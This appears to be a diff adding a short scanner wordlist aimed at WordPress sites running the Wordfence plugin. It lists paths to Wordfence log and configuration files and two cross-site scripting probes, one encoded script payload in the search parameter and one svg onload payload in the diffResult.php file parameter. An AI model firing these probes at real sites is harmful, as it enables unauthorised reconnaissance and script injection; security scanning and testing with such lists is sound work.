@@ -1,0 +1,6 @@
+
+/wp-content/wflogs/config.php
+/wp-content/wflogs/config-synced.php
+/wp-content/wflogs/rules.php
+/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
